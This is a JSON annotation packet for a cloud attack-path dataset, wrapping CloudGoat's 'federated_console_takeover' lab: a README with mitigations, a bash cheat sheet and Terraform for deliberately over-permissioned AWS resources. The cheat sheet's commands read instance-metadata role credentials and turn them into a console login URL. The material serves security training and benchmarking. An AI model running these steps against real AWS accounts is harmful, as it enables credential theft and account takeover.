@@ -1,0 +1,164 @@
+{
+  "workflow_version": "0.1",
+  "packet_sha256": "007629a9fcfb4b4279cd342c28235e011000e525558e6f83b730d8ca50dc1c93",
+  "case_id": "cloudgoat:aws:federated_console_takeover",
+  "role": "reviewer",
+  "annotator_id": "annotator_02",
+  "human_attestation": false,
+  "completed_at": null,
+  "path_ontology": {
+    "ontology_id": "cloud_data_path_v1",
+    "version": "1.0.0",
+    "sha256": "4f0cd3b97393781e9cce1a93c7047bb45ce2eddcb62d9392ebc6cbf5c6f2e13e"
+  },
+  "source": {
+    "source_id": "cloudgoat",
+    "upstream_url": "https://github.com/RhinoSecurityLabs/cloudgoat",
+    "version_or_commit": "abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed",
+    "license": "BSD-3-Clause",
+    "provenance_level": "C",
+    "raw_artifacts": [
+      {
+        "raw_ref": "data/real_sources/raw/cloudgoat/abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/snapshot.zip",
+        "sha256": "6e93d9311b2497de5219fe388be6d16e2209c6b44c9457c9fc044c25f32a75cc"
+      }
+    ]
+  },
+  "candidate_metadata": {
+    "candidate_id": "cloudgoat:aws:federated_console_takeover",
+    "kind": "executable_scenario",
+    "platform": "AWS",
+    "scenario": "federated_console_takeover",
+    "manifest_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/federated_console_takeover/manifest.yml",
+    "readme_paths": [
+      "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/federated_console_takeover/README.md",
+      "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/federated_console_takeover/cheat_sheet.md"
+    ],
+    "terraform_file_count": 7,
+    "has_cheat_sheet": true,
+    "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/federated_console_takeover/",
+    "review_score": 19,
+    "independence_group": "cloudgoat-scenario:federated_console_takeover",
+    "runtime_observations_in_packet": 0,
+    "mapped_technique_ids": [
+      "T1078.004",
+      "T1552.005",
+      "T1580"
+    ],
+    "routing_origin": "deterministic keyword/metadata routing of pinned upstream material; not a label"
+  },
+  "source_materials": [
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/federated_console_takeover/README.md",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/federated_console_takeover/README.md",
+      "member_sha256": "f921871e3a4cc75aabe32f77be4bf291451f7c10dced96b61f64b9263389ddc0",
+      "bytes": 3598,
+      "content_kind": "md",
+      "text": "# Scenario: federated_console_takeover\n\n**Size:** Medium\n\n**Difficulty:** Moderate\n\n**Command:** `./cloudgoat.py create federated_console_takeover`\n\n## Scenario Resources\n\n- 1 IAM User with limited permissions\n- 1 EC2 instance with IMDSv2 enabled\n- 1 IAM role with elevated permissions\n- 1 VPC with public subnet\n\n## Scenario Start(s)\n\n1. AWS Access Key and Secret Key for a low-privileged IAM user\n\n## Scenario Goal(s)\n\nPivot from limited CLI access to AWS Management Console with elevated permissions\n\n## Summary\n\nIn this scenario, you are given AWS CLI credentials for a low-privileged IAM user. Your task is to enumerate AWS resources, gain access to an EC2 instance via SSM Session Manager, exploit the IMDSv2 metadata service to retrieve temporary credentials, and use those credentials to generate a federation URL that allows you to access the AWS Management Console with elevated permissions.\n\n## Exploitation Route\n\n![federated_console_takeover](FlowChart.png)\n\n## Attack Path Diagram\n\n1. Configure AWS CLI with provided credentials\n2. Enumerate EC2 instances and IAM roles\n3. Access EC2 instance via SSM Session Manager\n4. Exploit IMDSv2 to retrieve temporary credentials\n5. Generate federation URL for console access\n\n## Walkthrough - Federated Console Takeover\n\nA detailed cheat sheet & walkthrough for this scenario is available [here](./cheat_sheet.md).\n\n## Learning Objectives\n\n- AWS CLI enumeration techniques\n- EC2 instance metadata service (IMDSv2) exploitation\n- AWS STS federation URL generation\n- Privilege escalation via IAM role assumption\n- Map techniques to MITRE ATT&CK (e.g., T1078.004, T1580, T1552.005)\n\n## Cloud Security Topics Covered\n\n- IAM permission boundaries and least privilege\n- EC2 metadata service security\n- AWS credential management and security\n- Federation and temporary credential usage\n\n## Real-World Relevance\n\nThis attack path mirrors techniques used in actual AWS breaches where attackers pivot from limited access to full console access by exploiting EC2 instance roles. Organizations should implement proper IAM configurations, enforce IMDSv2, and monitor for suspicious federation access to prevent such attacks.\n\nGaining AWS Console access is extremely useful for attackers. It allows them to blend in with legitimate user activity, evade detections designed for scripted CLI/API behavior, and interact with services more easily through the visual interface. While actions are still logged in CloudTrail, console access offers greater stealth, convenience, and visibility making post-exploitation far more effective. Additionally, certain capabilities like launching CloudShell or creating root account access keys are only possible through the console, further increasing its value to an attacker.\n\n##  Mitigations for federated console takeover via IMDSv2\n\n- Enforce IMDSv2 with hop limit = 1\n  - Blocks indirect metadata access via SSRF or shell-based exploits. Be sure to review your environment before implementing, as this may affect ECS tasks, containerized apps, or agents that access IMDS indirectly.\n\n- Limit EC2 instance role permissions\n  - Apply least privilege avoid broad roles like AdministratorAccess.\n\n- Restrict SSM access\n  - Only allow ssm:StartSession to trusted users or roles.\n\n- Monitor for credential exfiltration\n  - Use GuardDuty and CloudTrail to detect unusual IMDS or federation activity.\n\n- Disable sts:GetFederationToken unless needed\n  - Prevents abuse for console access via temporary credentials.\n\n- Use SCPs or permission boundaries\n  - Contain lateral movement and privilege escalation across environments.",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/federated_console_takeover/cheat_sheet.md",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/federated_console_takeover/cheat_sheet.md",
+      "member_sha256": "061575390fec1dd442ab3a0cb85b6854a72c7a327000960131124c757f46bac4",
+      "bytes": 4506,
+      "content_kind": "md",
+      "text": "## Cheat Sheet - federated_console_takeover\n---\n\n### Step 1: Initial Access and Enumeration\n\n---\n\n1. First, configure your AWS CLI with the provided credentials:\n\n```bash\n# Enter the provided Access Key, Secret Key, and region (us-east-1)\naws configure --profile\n```\n\n2. Verify your identity:\n\n```bash\n# Verifying your profile key\naws sts get-caller-identity --profile\n```\n\n3. Enumerate EC2 instances to locate potential public targets:\n\n```bash\naws ec2 describe-instances --profile\n```\n\n4. Identify IAM instance profiles attached to EC2 instances:\n\n```bash\naws ec2 describe-instances --query \"Reservations[].Instances[].IamInstanceProfile.Arn\" --profile\n```\n\n5. List available IAM roles to identify potential high-privilege roles:\n\n```bash\n# List all roles\naws iam list-roles\n\n# Query only roles that contain the profile instance\naws iam list-roles --query \"Roles[?contains(RoleName, 'cg-ec2-admin')].[RoleName]\" --profile\n```\n\n### Step 2: EC2 Access via SSM Session Manager\n\n---\n\n1. Install SSM Session Manager Plugin on your local. This step is required to access the EC2 through SSM Session Manager:\n\n```bash\n# Debian install\ncurl \"https://s3.amazonaws.com/session-manager-downloads/plugin/latest/ubuntu_64bit/session-manager-plugin.deb\" -o \"session-manager-plugin.deb\"\n\n# Install Command\nsudo dpkg -i session-manager-plugin.deb\n```\n\n### Step 3: IMDSv2 Exploitation\n\n---\n\n1. Access the EC2 instance using SSM Session Manager:\n\n```bash\naws ssm start-session --target i-<instance_id> --profile\n```\n\n2. Identity User (You should be logged in as ssm-user):\n\n```bash\n# Identify user\nwhoami\n```\n\n3. Switch to root user:\n\n```bash\n# Switch user\nsudo -i\n\n# Identify user\nwhoami\n```\n\n4. Generate an IMDSv2 token: You can perform this step to do further CLI enumeration with elevated privileges otherwise you can skip to Step 4 to generate management console URL.\n\n```bash\nTOKEN=$(curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\")\n```\n\n5. Use the token to retrieve the IAM role name:\n\n```bash\ncurl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/\n```\n\n6. Retrieve the temporary credentials for the IAM role:\n\n```bash\ncurl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/<role_name>\n```\n\n7. Configure the AWS CLI with the retrieved temporary credentials:\n\n```bash\n# Configure a new AWS CLI profile using the temporary credentials\naws configure --profile\n\n# Add the session token manually (AWS CLI v2 does not prompt for it)\naws configure set aws_session_token <Token from the metadata output> --profile\n```\n\n8. Verify your identity:\n\n```bash\n# Verifying your profile key\naws sts get-caller-identity --profile\n```\n\n### Step 4: Federation URL Generation\n\n---\n\n1. Request a metadata token for IMDSv2 (required to access EC2 instance metadata securely):\n\n```bash\nTOKEN=$(curl -sX PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\")\n```\n\n2. Retrieve the IAM role name attached to the EC2 instance using the metadata token:\n\n```bash\nROLE_NAME=$(curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/)\n```\n\n3. Retrieve temporary security credentials for the IAM role:\n\n```bash\nCREDS=$(curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME)\n```\n\n4. Build the session JSON object required for AWS federation login:\n\n```bash\nSESSION_JSON=$(jq -n \\\n--arg sid \"$(echo \"$CREDS\" | jq -r '.AccessKeyId')\" \\\n--arg skey \"$(echo \"$CREDS\" | jq -r '.SecretAccessKey')\" \\\n--arg stoken \"$(echo \"$CREDS\" | jq -r '.Token')\" \\\n'{sessionId: $sid, sessionKey: $skey, sessionToken: $stoken}')\n```\n\n5. URL-encode the temporary session JSON for use in the federation URL:\n\n```bash\nSESSION_URL_ENCODED=$(python3 -c \"import urllib.parse, sys; print(urllib.parse.quote(sys.stdin.read()))\" <<< \"$SESSION_JSON\")\n```\n\n6. Request a SignIn token using the encoded session:\n\n```bash\nSIGNIN_TOKEN=$(curl -s \"https://signin.aws.amazon.com/federation?Action=getSigninToken&Session=$SESSION_URL_ENCODED\" | jq -r '.SigninToken')\n```\n\n7. Generate the AWS Management Console login URL using the SignIn token:\n\n```bash\nLOGIN_URL=\"https://signin.aws.amazon.com/federation?Action=login&Issuer=cli-script&Destination=https://console.aws.amazon.com/&SigninToken=$SIGNIN_TOKEN\"\n```\n\n8. Echo Sign in URL\n\n```bash\necho \"$LOGIN_URL\"\n```",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/federated_console_takeover/manifest.yml",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/federated_console_takeover/manifest.yml",
+      "member_sha256": "b0beac228f9615f8d1012ea0a49bbd577e5b43f9658396829a84b9c849c82c5c",
+      "bytes": 743,
+      "content_kind": "yml",
+      "text": "---\n  # The name of the scenario, alpha-numeric characters only, and underscore-separated\n- name: federated_console_takeover\n# The name of the author(s), comma separated\n- author: Jimmy Barrios\n# The version of the scenario, where major versions are breaking changes and minor are small fixes.\n- version: 1.0\n# Text displayed to the user when they type \"federated_console_takeover help\"\n- help: |\n    In this scenario, you start with AWS CLI credentials for a low-privileged IAM user. \n    Your goal is to gain access to the AWS Management Console with elevated permissions\n    by exploiting an EC2 instance with IMDSv2 enabled.\n# Records the date upon which this scenario was last updated, in MM-DD-YYYY format\n- last-updated: 06-06-2025\n... ",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/federated_console_takeover/terraform/ec2.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/federated_console_takeover/terraform/ec2.tf",
+      "member_sha256": "9094624904e2336c460a3495efc7051a22dd7c666c1fbfbe63f7c93aa6f78f33",
+      "bytes": 2377,
+      "content_kind": "tf",
+      "text": "# EC2 Configuration for federated_console_takeover scenario\n\n# Get the latest Amazon Linux 2023 AMI\ndata \"aws_ami\" \"amazon_linux_2023\" {\n  most_recent = true\n  owners      = [\"amazon\"]\n\n  filter {\n    name   = \"name\"\n    values = [\"al2023-ami-*-x86_64\"]\n  }\n\n  filter {\n    name   = \"virtualization-type\"\n    values = [\"hvm\"]\n  }\n}\n\n# Security group\nresource \"aws_security_group\" \"instance_sg\" {\n  name        = \"cg-instance-sg-${var.cgid}\"\n  description = \"SG for the EC2 instance\"\n  vpc_id      = aws_vpc.vpc.id\n\n  # No inbound rules needed for SSM access\n  # SSM uses outbound HTTPS connections\n\n  egress {\n    from_port   = 0\n    to_port     = 0\n    protocol    = \"-1\"\n    cidr_blocks = [\"0.0.0.0/0\"]\n  }\n\n  tags = {\n    Name = \"cg-instance-sg-${var.cgid}\"\n  }\n}\n\n# EC2 instance with IMDSv2 enabled\nresource \"aws_instance\" \"vulnerable_ec2\" {\n  ami                  = data.aws_ami.amazon_linux_2023.id\n  instance_type        = var.ec2_instance_type\n  iam_instance_profile = aws_iam_instance_profile.ec2_admin_profile.name\n  subnet_id            = aws_subnet.subnet.id\n  \n  # Associate public IP\n  associate_public_ip_address = true\n  \n  # Enable IMDSv2 accessible\n  metadata_options {\n    http_endpoint = \"enabled\"\n    http_tokens   = \"required\" # Enforce IMDSv2\n  }\n  \n  vpc_security_group_ids = [\n    aws_security_group.instance_sg.id\n  ]\n  \n  # User data to install tools\n  user_data = <<-EOF\n    #!/bin/bash\n    dnf update -y\n    dnf install -y jq curl wget python3 python3-pip\n    pip3 install --upgrade awscli\n    echo \"export PATH=$PATH:/usr/local/bin\" >> /etc/profile\n    echo \"PS1='\\[\\033[01;33m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ '\" >> /etc/bashrc\n\n    echo \"==== Installing Session Manager Plugin ====\"\n    curl \"https://s3.amazonaws.com/session-manager-downloads/plugin/latest/linux_64bit/session-manager-plugin.rpm\" -o \"session-manager-plugin.rpm\"\n    dnf install -y ./session-manager-plugin.rpm\n    # Make sure the plugin is in the path for all users\n    echo \"export PATH=\\$PATH:/usr/local/bin:/usr/bin\" >> /etc/profile\n    # Verify plugin installation\n    session-manager-plugin --version\n    \n    # Enable SSM agent\n    dnf install -y amazon-ssm-agent\n    systemctl enable amazon-ssm-agent\n    systemctl start amazon-ssm-agent\n\n    # Install nano\n    dnf install -y nano\n\n  EOF\n  \n  tags = {\n    Name = \"cg-vulnerable-ec2-${var.cgid}\"\n  }\n} ",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/federated_console_takeover/terraform/iam.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/federated_console_takeover/terraform/iam.tf",
+      "member_sha256": "da6bdedcd642a791a12bb58da5bf12a3e5996687de8d92aa4e7344ed9f43b9e4",
+      "bytes": 2348,
+      "content_kind": "tf",
+      "text": "# IAM Configuration for federated_console_takeover scenario\n\n# Initial user with limited permissions\nresource \"aws_iam_user\" \"initial_user\" {\n  name = \"cg-initial-user-${var.cgid}\"\n  \n  tags = {\n    Name = \"cg-initial-user-${var.cgid}\"\n  }\n}\n\nresource \"aws_iam_access_key\" \"initial_user\" {\n  user = aws_iam_user.initial_user.name\n}\n\nresource \"aws_iam_user_policy\" \"initial_user_policy\" {\n  name = \"cg-initial-user-policy-${var.cgid}\"\n  user = aws_iam_user.initial_user.name\n\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect = \"Allow\"\n        Action = [\n          \"ec2:DescribeInstances\",\n          \"ec2:DescribeIamInstanceProfileAssociations\",\n          \"iam:ListRoles\",\n          \"ssm:StartSession\",\n          \"sts:GetCallerIdentity\"\n        ]\n        Resource = \"*\"\n      },\n      {\n        Effect = \"Allow\"\n        Action = [\n          \"ssm:TerminateSession\"\n        ]\n        Resource = \"arn:aws:ssm:*:*:session/$${aws:username}-*\"\n      }\n    ]\n  })\n}\n\n# EC2 Admin Role with elevated permissions\nresource \"aws_iam_role\" \"ec2_admin_role\" {\n  name = \"cg-ec2-admin-role-${var.cgid}\"\n  \n  assume_role_policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect = \"Allow\"\n        Principal = {\n          Service = \"ec2.amazonaws.com\"\n        }\n        Action = \"sts:AssumeRole\"\n      }\n    ]\n  })\n  \n  tags = {\n    Name = \"cg-ec2-admin-role-${var.cgid}\"\n  }\n}\n\n# EC2 Admin Role Policy\nresource \"aws_iam_role_policy\" \"ec2_admin_policy\" {\n  name = \"cg-ec2-admin-policy-${var.cgid}\"\n  role = aws_iam_role.ec2_admin_role.id\n\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect = \"Allow\"\n        Action = [\n          \"iam:ListUsers\",\n          \"iam:GetUser\",\n          \"ec2:*\",\n          \"ssm:GetParameter*\",\n          \"ssm:DescribeParameters\"\n        ]\n        Resource = \"*\"\n      }\n    ]\n  })\n}\n\n# Attach the EC2 Role to an Instance Profile\nresource \"aws_iam_instance_profile\" \"ec2_admin_profile\" {\n  name = \"cg-ec2-admin-profile-${var.cgid}\"\n  role = aws_iam_role.ec2_admin_role.name\n}\n\n# SSM Role Policy (allowing EC2 to communicate with SSM)\nresource \"aws_iam_role_policy_attachment\" \"ssm_managed_instance_core\" {\n  role       = aws_iam_role.ec2_admin_role.name\n  policy_arn = \"arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore\"\n} ",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/federated_console_takeover/terraform/outputs.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/federated_console_takeover/terraform/outputs.tf",
+      "member_sha256": "624617de60cbc2c524ec08c3d402e583e690f18419e445a536899a08b1443712",
+      "bytes": 855,
+      "content_kind": "tf",
+      "text": "## Output Configuration for federated_console_takeover scenario\n\n# Initial access credentials\noutput \"initial_access_key_id\" {\n  value = aws_iam_access_key.initial_user.id\n}\n\noutput \"initial_access_key_secret\" {\n  value     = aws_iam_access_key.initial_user.secret\n  sensitive = true\n}\n\n\n# Scenario instructions\noutput \"cloudgoat_output_message\" {\n  value = <<EOT\n  \n========================[ federated_console_takeover ]========================\n\nINITIAL ACCESS:\n  AWS Access Key ID: ${aws_iam_access_key.initial_user.id}\n  AWS Secret Key: ${aws_iam_access_key.initial_user.secret}\n  Region: ${var.region}\n\nSCENARIO OBJECTIVE:\n  Pivot from limited AWS CLI access to AWS Management Console \n  with elevated permissions through IMDSv2 exploitation.\n\n========================[ Good luck and happy hacking! ]========================\n\nEOT\n  sensitive = true\n} ",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/federated_console_takeover/terraform/provider.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/federated_console_takeover/terraform/provider.tf",
+      "member_sha256": "8bbddf29e5715929979386cd2e42e1b105fdc4e161fef6df42ea29272a266a43",
+      "bytes": 451,
+      "content_kind": "tf",
+      "text": "# AWS Provider Configuration for federated_console_takeover scenario\n# Configure required Terraform and provider versions.\n\nterraform {\n  required_version = \">= 1.5\"\n\n  required_providers {\n    aws = {\n      source  = \"hashicorp/aws\"\n      version = \">= 5.74.0\"\n    }\n  }\n}\n\nprovider \"aws\" {\n  profile = var.profile\n  region  = var.region\n  \n  default_tags {\n    tags = {\n      Stack    = var.stack-name\n      Scenario = var.scenario-name\n    }\n  }\n} ",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/federated_console_takeover/terraform/ssm.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/federated_console_takeover/terraform/ssm.tf",
+      "member_sha256": "f0185948973e434369acf620aeff8344a64d71b740ad26a73a05ac1d7960be44",
+      "bytes": 885,
+      "content_kind": "tf",
+      "text": "# SSM Configuration for federated_console_takeover scenario\n\n# SSM Document for Session Manager customization\nresource \"aws_ssm_document\" \"session_manager_preferences\" {\n  name            = \"cg-ssm-preferences-${var.cgid}\"\n  document_type   = \"Session\"\n  document_format = \"JSON\"\n  \n  content = jsonencode({\n    schemaVersion = \"1.0\"\n    description   = \"Document to customize Session Manager preferences\"\n    sessionType   = \"Standard_Stream\"\n    inputs = {\n      s3BucketName                = \"\"\n      s3KeyPrefix                 = \"\"\n      s3EncryptionEnabled         = true\n      cloudWatchLogGroupName      = \"\"\n      cloudWatchEncryptionEnabled = true\n      idleSessionTimeout          = \"20\"\n      shellProfile = {\n        linux = \"echo 'Welcome to the CloudGoat federated_console_takeover scenario!'\\necho 'Try exploring the instance metadata service...'\"\n      }\n    }\n  })\n} ",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/federated_console_takeover/terraform/variables.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/federated_console_takeover/terraform/variables.tf",
+      "member_sha256": "d5de97b1ff72c11b6ba280600dfc02f99f54e9f537729b6dc5824a6bfaa44402",
+      "bytes": 1879,
+      "content_kind": "tf",
+      "text": "## Variables for federated_console_takeover scenario\n\nvariable \"profile\" {\n  description = \"The AWS profile to use when deploying resources\"\n  type        = string\n}\n\nvariable \"region\" {\n  description = \"The AWS region to deploy resources into\"\n  default     = \"us-east-1\"\n  type        = string\n\n  validation {\n    condition     = can(regex(\"^(us-east-1|us-west-1|us-west-2|eu-west-1|eu-central-1)$\", var.region))\n    error_message = \"The region must be a valid AWS region where all required services are available.\"\n  }\n}\n\nvariable \"cgid\" {\n  description = \"CGID variable for unique naming between scenarios\"\n  type        = string\n\n  validation {\n    condition     = can(regex(\"^[a-z0-9]{6,20}$\", var.cgid))\n    error_message = \"The cgid must be 6-20 lowercase alphanumeric characters.\"\n  }\n}\n\nvariable \"cg_whitelist\" {\n  description = \"User's public IP address(es) for restricting access to resources\"\n  type        = list(string)\n}\n\n# VPC and networking variables\nvariable \"vpc_cidr\" {\n  description = \"CIDR block for the VPC\"\n  default     = \"10.0.0.0/16\"\n  type        = string\n}\n\nvariable \"subnet_cidr\" {\n  description = \"CIDR block for the public subnet\"\n  default     = \"10.0.1.0/24\"\n  type        = string\n}\n\n# EC2 variables\nvariable \"ec2_instance_type\" {\n  description = \"Instance type for EC2 instance\"\n  default     = \"t3.micro\"\n  type        = string\n\n  validation {\n    condition     = contains([\"t3.micro\", \"t3.small\", \"t4g.micro\"], var.ec2_instance_type)\n    error_message = \"The instance type must be small to stay within free tier limits.\"\n  }\n}\n\n# Stack naming variables required by CloudGoat\nvariable \"stack-name\" {\n  description = \"Name of the stack\"\n  default     = \"CloudGoat\"\n  type        = string\n}\n\nvariable \"scenario-name\" {\n  description = \"Name of the scenario being deployed\"\n  default     = \"federated_console_takeover\"\n  type        = string\n} ",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/federated_console_takeover/terraform/vpc.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/federated_console_takeover/terraform/vpc.tf",
+      "member_sha256": "edb784d70cf4ede7cb280b0d7bd0d08450d8dd5e989c70be8cb1dd23519a27f5",
+      "bytes": 2971,
+      "content_kind": "tf",
+      "text": "# VPC Configuration for federated_console_takeover scenario\n\nresource \"aws_vpc\" \"vpc\" {\n  cidr_block           = var.vpc_cidr\n  enable_dns_support   = true  # Required for VPC endpoints with private DNS\n  enable_dns_hostnames = true  # Required for VPC endpoints with private DNS\n  \n  tags = {\n    Name = \"cg-vpc-${var.cgid}\"\n  }\n}\n\nresource \"aws_internet_gateway\" \"igw\" {\n  vpc_id = aws_vpc.vpc.id\n  \n  tags = {\n    Name = \"cg-igw-${var.cgid}\"\n  }\n}\n\nresource \"aws_subnet\" \"subnet\" {\n  vpc_id                  = aws_vpc.vpc.id\n  cidr_block              = var.subnet_cidr\n  availability_zone       = \"${var.region}a\"\n  map_public_ip_on_launch = true\n\n  tags = {\n    Name = \"cg-subnet-${var.cgid}\"\n  }\n}\n\nresource \"aws_route_table\" \"route_table\" {\n  vpc_id = aws_vpc.vpc.id\n  \n  tags = {\n    Name = \"cg-route-table-${var.cgid}\"\n  }\n}\n\nresource \"aws_route\" \"route\" {\n  route_table_id         = aws_route_table.route_table.id\n  destination_cidr_block = \"0.0.0.0/0\"\n  gateway_id             = aws_internet_gateway.igw.id\n}\n\nresource \"aws_route_table_association\" \"route_table_association\" {\n  subnet_id      = aws_subnet.subnet.id\n  route_table_id = aws_route_table.route_table.id\n}\n\n# VPC Endpoint for SSM\nresource \"aws_vpc_endpoint\" \"ssm\" {\n  vpc_id            = aws_vpc.vpc.id\n  service_name      = \"com.amazonaws.${var.region}.ssm\"\n  vpc_endpoint_type = \"Interface\"\n  subnet_ids        = [aws_subnet.subnet.id]\n  \n  security_group_ids = [\n    aws_security_group.vpc_endpoint_sg.id\n  ]\n  \n  private_dns_enabled = true\n  \n  tags = {\n    Name = \"cg-ssm-endpoint-${var.cgid}\"\n  }\n}\n\n# VPC Endpoint for SSM Messages\nresource \"aws_vpc_endpoint\" \"ssm_messages\" {\n  vpc_id            = aws_vpc.vpc.id\n  service_name      = \"com.amazonaws.${var.region}.ssmmessages\"\n  vpc_endpoint_type = \"Interface\"\n  subnet_ids        = [aws_subnet.subnet.id]\n  \n  security_group_ids = [\n    aws_security_group.vpc_endpoint_sg.id\n  ]\n  \n  private_dns_enabled = true\n  \n  tags = {\n    Name = \"cg-ssm-messages-endpoint-${var.cgid}\"\n  }\n}\n\n# VPC Endpoint for EC2 Messages\nresource \"aws_vpc_endpoint\" \"ec2_messages\" {\n  vpc_id            = aws_vpc.vpc.id\n  service_name      = \"com.amazonaws.${var.region}.ec2messages\"\n  vpc_endpoint_type = \"Interface\"\n  subnet_ids        = [aws_subnet.subnet.id]\n  \n  security_group_ids = [\n    aws_security_group.vpc_endpoint_sg.id\n  ]\n  \n  private_dns_enabled = true\n  \n  tags = {\n    Name = \"cg-ec2-messages-endpoint-${var.cgid}\"\n  }\n}\n\n# Security Group for VPC Endpoints\nresource \"aws_security_group\" \"vpc_endpoint_sg\" {\n  name        = \"cg-vpc-endpoint-sg-${var.cgid}\"\n  description = \"Allow TLS inbound traffic for VPC endpoints\"\n  vpc_id      = aws_vpc.vpc.id\n  \n  ingress {\n    from_port   = 443\n    to_port     = 443\n    protocol    = \"tcp\"\n    cidr_blocks = [var.vpc_cidr]\n  }\n  \n  egress {\n    from_port   = 0\n    to_port     = 0\n    protocol    = \"-1\"\n    cidr_blocks = [\"0.0.0.0/0\"]\n  }\n  \n  tags = {\n    Name = \"cg-vpc-endpoint-sg-${var.cgid}\"\n  }\n} ",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    }
+  ],
+  "runtime_instances": [],
+  "source_context_fields": [
+    "candidate_metadata",
+    "runtime_instances",
+    "source",
+    "source_materials"
+  ],
+  "source_context_sha256": "1d9c7ff429093ad35e299bf4605f37a9cf1c15e1918f064283de4c3cf4870275",
+  "admission_screen": {
+    "external_or_low_privilege_entry_defined": null,
+    "multi_step_path_present": null,
+    "cloud_data_target_present": null,
+    "critical_edges_have_raw_evidence": null,
+    "not_a_near_duplicate": null,
+    "decision": null,
+    "rationale": null
+  },
+  "nodes": [],
+  "edges": [],
+  "path_labels": [],
+  "tool_tasks": [],
+  "instance_labels": []
+}
